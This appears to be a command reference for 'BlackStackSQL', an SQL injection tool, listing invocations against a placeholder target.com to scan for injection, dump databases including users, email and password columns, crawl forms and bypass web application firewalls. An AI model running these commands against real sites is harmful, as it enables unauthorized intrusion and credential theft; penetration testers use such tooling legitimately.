# BlackStackSQL Command Reference

## Basic Commands

### Scan a URL for SQL Injection

```bash
python3 main.py --url http://target.com?id=1 --scan
```

### Dump Database Structure and Data

```bash
python3 main.py --url http://target.com?id=1 --dump
```

### Dump Specific Columns

```bash
python3 main.py --url http://target.com?id=1 --dump --columns users,email,password
```

### Enable Form Crawling

```bash
python3 main.py --url http://target.com --form
```

### Enable WAF Bypass

```bash
python3 main.py --url http://target.com?id=1 --waf-bypass
```

### Use a Proxy

```bash
python3 main.py --url http://target.com?id=1 --proxy http://127.0.0.1:8080
```

### Send Custom Cookies

```bash
python3 main.py --url http://target.com?id=1 --cookie "sessionid=abc123"
```

### Add Custom Headers

```bash
python3 main.py --url http://target.com?id=1 --header "X-Custom-Header: value"
```

### Resume a Previous Session

```bash
python3 main.py --resume /path/to/session
```

### Save Results as JSON

```bash
python3 main.py --url http://target.com?id=1 --save-json
```

### Save Log as HTML

```bash
python3 main.py --url http://target.com?id=1 --html-log
```

## Advanced Usage

### Combine Multiple Options

```bash
python3 main.py --url http://target.com?id=1 --scan --dump --columns users,email,password --waf-bypass --proxy http://127.0.0.1:8080
```

### Use with POST Data

```bash
python3 main.py --url http://target.com/login.php --data "username=admin&password=1" --scan
```

### Enable Aggressive Scanning

```bash
python3 main.py --url http://target.com?id=1 --aggressive
```

### Specify Number of Threads

```bash
python3 main.py --url http://target.com?id=1 --threads 10
```

## Examples

### Basic Scan

```bash
python3 main.py --url http://target.com?id=1 --scan
```

### Full Scan with Dump and WAF Bypass

```bash
python3 main.py --url http://target.com?id=1 --scan --dump --waf-bypass
```

### Crawl Forms and Dump Specific Columns

```bash
python3 main.py --url http://target.com --form --dump --columns users,email,password
```

### Use Proxy and Save Results

```bash
python3 main.py --url http://target.com?id=1 --proxy http://127.0.0.1:8080 --save-json
```

### Resume a Session

```bash
python3 main.py --resume /path/to/session
